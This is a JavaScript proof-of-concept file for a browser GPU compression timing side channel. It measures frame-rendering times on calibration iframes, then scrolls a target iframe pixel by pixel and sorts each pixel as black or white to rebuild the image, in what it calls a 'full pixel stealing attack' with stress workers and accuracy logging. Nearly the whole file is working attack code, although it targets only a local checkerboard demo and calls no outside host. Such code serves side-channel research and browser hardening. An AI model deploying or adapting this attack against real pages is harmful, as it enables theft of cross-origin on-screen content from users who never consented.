// GPU Compression Side-Channel PoC - Rendering Time Version (FULL ATTACK)
// Self-contained local version

// Configuration variables
let timeCollect, repetition, stressType, warmupTime;
let divSize, layerNum;
let thresholdLow, thresholdHigh;
let numWorkers, bigintDigits;
let testMode;
let running = false;

// Calibration statistics
let blackStats = null;
let whiteStats = null;

// Worker array for memory stress
let workers = [];

// Reconstruction state
let imageWidth = 48;  // Default checkerboard size
let imageHeight = 48;
let reconstructionCanvas = null;
let reconstructionCtx = null;

// Platform detection
function detectPlatform() {
  const canvas = document.createElement('canvas');
  const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
  
  if (gl) {
    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    if (debugInfo) {
      const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
      document.getElementById('gpu-info').textContent = renderer;
      
      if (renderer.includes('Intel')) {
        return 'intel-igpu';
      } else if (renderer.includes('AMD') || renderer.includes('Radeon')) {
        return 'amd-igpu';
      } else if (renderer.includes('NVIDIA') || renderer.includes('GeForce')) {
        return 'nvidia-dgpu';
      }
    }
  }
  
  document.getElementById('gpu-info').textContent = 'Unknown (WebGL detection failed)';
  return 'unknown';
}

// Update status message
function updateStatus(message) {
  document.getElementById('status').textContent = message;
  console.log('[Status]', message);
}

// Read configuration from UI
function readConfig() {
  timeCollect = parseInt(document.getElementById('time_collect').value);
  repetition = parseInt(document.getElementById('rept').value);
  stressType = parseInt(document.getElementById('stress_type').value);
  warmupTime = parseInt(document.getElementById('warmup').value);
  divSize = parseInt(document.getElementById('div_size').value);
  layerNum = parseInt(document.getElementById('layer').value);
  thresholdLow = parseFloat(document.getElementById('low').value);
  thresholdHigh = parseFloat(document.getElementById('high').value);
  numWorkers = parseInt(document.getElementById('num_workers').value);
  bigintDigits = parseInt(document.getElementById('bigint_digits').value);
  testMode = document.getElementById('test_mode').checked;
  
  console.log('[Config] Read configuration:', {
    timeCollect, repetition, stressType, warmupTime,
    divSize, layerNum, thresholdLow, thresholdHigh,
    numWorkers, bigintDigits, testMode
  });
}

// Start memory stress workers
function startStressWorkers() {
  if (stressType === 0) return;
  
  console.log(`[Stress] Starting ${numWorkers} memory stress workers`);
  
  for (let i = 0; i < numWorkers; i++) {
    try {
      const worker = new Worker('../shared/worker_big.js');
      worker.postMessage({ digits: bigintDigits });
      workers.push(worker);
    } catch (e) {
      console.error('[Stress] Failed to start worker:', e);
    }
  }
  
  updateStatus(`Stress workers: ${workers.length} active`);
}

// Stop memory stress workers
function stopStressWorkers() {
  workers.forEach(w => w.terminate());
  workers = [];
  console.log('[Stress] Stopped all workers');
}

// Measure rendering time
async function measureRenderingTime(iframe, duration, sampleCount) {
  return new Promise((resolve) => {
    const times = [];
    let lastTime = performance.now();
    let startTime = lastTime;
    let count = 0;
    
    function measure() {
      const currentTime = performance.now();
      const elapsed = currentTime - startTime;
      
      if (elapsed < duration && count < sampleCount) {
        const frameTime = currentTime - lastTime;
        times.push(frameTime);
        lastTime = currentTime;
        count++;
        requestAnimationFrame(measure);
      } else {
        resolve(times);
      }
    }
    
    requestAnimationFrame(measure);
  });
}

// Calculate statistics
function calculateStats(times) {
  if (!times || times.length === 0) {
    return { mean: 0, std: 0, min: 0, max: 0, median: 0 };
  }
  
  // Filter outliers (simple method: remove top/bottom 10%)
  const sorted = times.slice().sort((a, b) => a - b);
  const trimCount = Math.floor(sorted.length * 0.1);
  const trimmed = sorted.slice(trimCount, sorted.length - trimCount);
  
  const mean = trimmed.reduce((a, b) => a + b, 0) / trimmed.length;
  const variance = trimmed.reduce((a, b) => a + Math.pow(b - mean, 2), 0) / trimmed.length;
  const std = Math.sqrt(variance);
  const min = Math.min(...trimmed);
  const max = Math.max(...trimmed);
  const median = trimmed[Math.floor(trimmed.length / 2)];
  
  return { mean, std, min, max, median };
}

// Scroll target iframe to specific pixel position
function scrollToPixel(iframe, x, y) {
  try {
    const iframeDoc = iframe.contentWindow.document;
    const scrollDiv = iframeDoc.getElementById('scroll');
    if (scrollDiv) {
      scrollDiv.scrollLeft = x;
      scrollDiv.scrollTop = y;
      console.log(`[Scroll] Positioned to pixel (${x}, ${y})`);
      return true;
    } else {
      console.warn('[Scroll] No scroll div found in iframe');
      return false;
    }
  } catch (e) {
    console.error('[Scroll] Failed to scroll iframe:', e);
    return false;
  }
}

// Wait for a specific number of animation frames
function waitFrames(numFrames) {
  return new Promise((resolve) => {
    let count = 0;
    function frame() {
      count++;
      if (count >= numFrames) {
        resolve();
      } else {
        requestAnimationFrame(frame);
      }
    }
    requestAnimationFrame(frame);
  });
}

// Measure timing for current iframe state
async function measureCurrentState(iframe, samples = 30) {
  const times = [];
  
  for (let i = 0; i < samples; i++) {
    const startTime = performance.now();
    await waitFrames(2); // Wait for rendering
    const endTime = performance.now();
    times.push(endTime - startTime);
  }
  
  return calculateStats(times);
}

// Classify pixel based on timing measurement
function classifyPixel(stats, blackMean, whiteMean, low, high) {
  const range = whiteMean - blackMean;
  const threshold_low = blackMean + range * low;
  const threshold_high = blackMean + range * high;
  
  if (stats.mean < threshold_low) {
    return { color: 'black', confidence: 'high', hex: '#000000' };
  } else if (stats.mean > threshold_high) {
    return { color: 'white', confidence: 'high', hex: '#ffffff' };
  } else {
    // Medium confidence - use median as tiebreaker
    const threshold_mid = blackMean + range * 0.5;
    if (stats.median < threshold_mid) {
      return { color: 'black', confidence: 'medium', hex: '#000000' };
    } else {
      return { color: 'white', confidence: 'medium', hex: '#ffffff' };
    }
  }
}

// Paint pixel on reconstruction canvas
function paintReconstructedPixel(x, y, color) {
  if (!reconstructionCtx) return;
  
  reconstructionCtx.fillStyle = color;
  reconstructionCtx.fillRect(x, y, 1, 1);
}

// Get expected pixel color for validation (checkerboard pattern)
function getExpectedPixelColor(x, y) {
  const squareSize = 12; // 48 / 4 = 12 pixels per square
  const rowSquare = Math.floor(y / squareSize);
  const colSquare = Math.floor(x / squareSize);
  const isBlack = (rowSquare + colSquare) % 2 === 0;
  return isBlack ? '#000000' : '#ffffff';
}

// Main calibration function
async function runCalibration() {
  updateStatus('Warming up...');
  await new Promise(resolve => setTimeout(resolve, warmupTime));
  
  updateStatus('Measuring BLACK pattern...');
  const blackIframe = document.getElementById('iframe-black');
  const blackTimes = await measureRenderingTime(blackIframe, timeCollect, repetition);
  const blackStats = calculateStats(blackTimes);
  
  console.log('[Calibration] Black stats:', blackStats);
  document.getElementById('black-time').textContent = blackStats.mean.toFixed(2);
  
  await new Promise(resolve => setTimeout(resolve, 2000));
  
  updateStatus('Measuring WHITE pattern...');
  const whiteIframe = document.getElementById('iframe-white');
  const whiteTimes = await measureRenderingTime(whiteIframe, timeCollect, repetition);
  const whiteStats = calculateStats(whiteTimes);
  
  console.log('[Calibration] White stats:', whiteStats);
  document.getElementById('white-time').textContent = whiteStats.mean.toFixed(2);
  
  const ratio = whiteStats.mean / blackStats.mean;
  document.getElementById('timing-ratio').textContent = ratio.toFixed(3);
  
  console.log(`[Calibration] Black: ${blackStats.mean.toFixed(2)}ms, White: ${whiteStats.mean.toFixed(2)}ms, Ratio: ${ratio.toFixed(3)}`);
  
  if (ratio < 1.2) {
    updateStatus('Warning: Small timing difference. Attack may not be reliable.');
    console.warn('[Calibration] Timing difference too small for reliable detection');
  } else if (ratio > 2.0) {
    updateStatus('Done: Excellent timing separation! Ready for attack.');
  } else {
    updateStatus('Done: Good timing separation. Attack should work.');
  }
  
  return { blackStats, whiteStats, ratio };
}

// Main test function
async function runTest() {
  if (running) {
    console.warn('[Test] Already running');
    return;
  }
  
  running = true;
  document.getElementById('run-button').disabled = true;
  
  try {
    readConfig();
    
    // Start stress workers if enabled
    if (stressType === 1) {
      startStressWorkers();
      await new Promise(resolve => setTimeout(resolve, 2000));
    }
    
    // Run calibration
    const calibration = await runCalibration();
    blackStats = calibration.blackStats;
    whiteStats = calibration.whiteStats;
    
    if (testMode) {
      updateStatus('Done: Test mode complete. Check results above.');
    } else {
      // FULL ATTACK MODE - Pixel Stealing
      await runFullAttack(calibration);
    }
    
  } catch (error) {
    console.error('[Error] Test failed:', error);
    updateStatus('Error: ' + error.message);
  } finally {
    stopStressWorkers();
    running = false;
    document.getElementById('run-button').disabled = false;
  }
}

// Full pixel stealing attack
async function runFullAttack(calibration) {
  console.log('[ATTACK] Starting full pixel stealing attack');
  
  updateStatus('🎯 Starting pixel-by-pixel reconstruction...');
  
  // Initialize reconstruction canvas
  reconstructionCanvas = document.getElementById('reconstruction-canvas');
  reconstructionCtx = reconstructionCanvas.getContext('2d');
  reconstructionCtx.fillStyle = '#808080';
  reconstructionCtx.fillRect(0, 0, imageWidth, imageHeight);
  
  // Get target iframe
  const targetIframe = document.getElementById('iframe-target');
  
  // Wait for iframe to be ready
  await new Promise(resolve => setTimeout(resolve, 1000));
  
  // Statistics
  let totalPixels = imageWidth * imageHeight;
  let processedPixels = 0;
  let correctPixels = 0;
  let startTime = performance.now();
  
  console.log(`[ATTACK] Reconstructing ${imageWidth}x${imageHeight} = ${totalPixels} pixels`);
  
  // Loop through each pixel
  for (let y = 0; y < imageHeight; y++) {
    for (let x = 0; x < imageWidth; x++) {
      if (!running) {
        updateStatus('Attack stopped by user');
        return;
      }
      
      // Scroll to pixel (x, y)
      scrollToPixel(targetIframe, x, y);
      
      // Wait for rendering to stabilize
      await waitFrames(3);
      
      // Measure timing
      const stats = await measureCurrentState(targetIframe, 20);
      
      // Classify pixel
      const classification = classifyPixel(
        stats,
        blackStats.mean,
        whiteStats.mean,
        thresholdLow,
        thresholdHigh
      );
      
      // Paint reconstructed pixel
      paintReconstructedPixel(x, y, classification.hex);
      
      // Validate (for checkerboard pattern)
      const expected = getExpectedPixelColor(x, y);
      const isCorrect = classification.hex === expected;
      if (isCorrect) correctPixels++;
      
      processedPixels++;
      const accuracy = ((correctPixels / processedPixels) * 100).toFixed(1);
      const progress = ((processedPixels / totalPixels) * 100).toFixed(1);
      const elapsed = ((performance.now() - startTime) / 1000).toFixed(1);
      const eta = ((elapsed / processedPixels) * (totalPixels - processedPixels)).toFixed(0);
      
      // Log progress every 48 pixels (one row)
      if (x === imageWidth - 1) {
        console.log(`[ATTACK] Row ${y + 1}/${imageHeight} complete - ` +
                   `Accuracy: ${accuracy}% - Progress: ${progress}% - ` +
                   `Time: ${elapsed}s - ETA: ${eta}s`);
      }
      
      // Update status
      updateStatus(`🎯 Stealing pixels: ${progress}% (${processedPixels}/${totalPixels}) - ` +
                  `Accuracy: ${accuracy}% - ETA: ${eta}s`);
      
      // Detailed log for debugging (every 10th pixel)
      if (processedPixels % 10 === 0) {
        console.log(`[PIXEL] (${x},${y}): ${classification.color} (${classification.confidence}) ` +
                   `timing=${stats.mean.toFixed(2)}ms ` +
                   `expected=${expected} ` +
                   `${isCorrect ? 'Done:' : '✗'}`);
      }
    }
  }
  
  // Attack complete
  const totalTime = ((performance.now() - startTime) / 1000).toFixed(1);
  const finalAccuracy = ((correctPixels / totalPixels) * 100).toFixed(1);
  
  console.log(`[ATTACK] COMPLETE!`);
  console.log(`[ATTACK] Total time: ${totalTime}s`);
  console.log(`[ATTACK] Total pixels: ${totalPixels}`);
  console.log(`[ATTACK] Correct pixels: ${correctPixels}`);
  console.log(`[ATTACK] Accuracy: ${finalAccuracy}%`);
  console.log(`[ATTACK] Average time per pixel: ${(totalTime / totalPixels).toFixed(2)}s`);
  
  updateStatus(`Attack complete! Accuracy: ${finalAccuracy}% (${correctPixels}/${totalPixels}) in ${totalTime}s`);
  
  // Show results
  document.getElementById('attack-results').style.display = 'block';
  document.getElementById('attack-accuracy').textContent = finalAccuracy + '%';
  document.getElementById('attack-time').textContent = totalTime + 's';
  document.getElementById('attack-pixels').textContent = `${correctPixels}/${totalPixels}`;
}

// Stop function
function stopTest() {
  running = false;
  stopStressWorkers();
  updateStatus('Stopped');
  document.getElementById('run-button').disabled = false;
}

// Pattern selector handler
function updatePattern() {
  const pattern = document.getElementById('pattern-select').value;
  const iframe = document.getElementById('iframe-target');
  iframe.src = `pixel-embed-${pattern}.html`;
  console.log('[Pattern] Switched to:', pattern);
}

// Initialize
document.addEventListener('DOMContentLoaded', () => {
  console.log('[Init] GPU Compression PoC - Rendering Time Version');
  console.log('[Init] Self-contained local version');
  
  // Detect platform
  const platform = detectPlatform();
  document.getElementById('platform-info').textContent = platform.toUpperCase();
  
  if (platform === 'nvidia-dgpu') {
    document.getElementById('info-panel').style.background = '#fff3cd';
    document.getElementById('info-panel').innerHTML += '<br><strong> Note:</strong> NVIDIA dGPU detected. This PoC may show minimal timing differences due to dedicated memory. Consider using chrome-cache or direct GPU timing tests instead.';
  } else if (platform === 'amd-igpu') {
    document.getElementById('info-panel').innerHTML += '<br><strong> AMD Radeon iGPU:</strong> Should work well. May need to adjust layer count and enable memory stress.';
  } else if (platform === 'intel-igpu') {
    document.getElementById('info-panel').innerHTML += '<br><strong> Intel iGPU:</strong> Optimal platform for this PoC.';
  }
  
  // Attach event handlers
  document.getElementById('run-button').addEventListener('click', runTest);
  document.getElementById('stop-button').addEventListener('click', stopTest);
  document.getElementById('pattern-select').addEventListener('change', updatePattern);
  
  // Set window size-based div size
  const windowHeight = window.outerHeight * window.devicePixelRatio;
  const windowWidth = window.outerWidth * window.devicePixelRatio;
  document.getElementById('div_size').value = Math.max(windowHeight, windowWidth);
  
  updateStatus('Ready. Configure parameters and click Run.');
  console.log('[Init] Initialization complete');
});


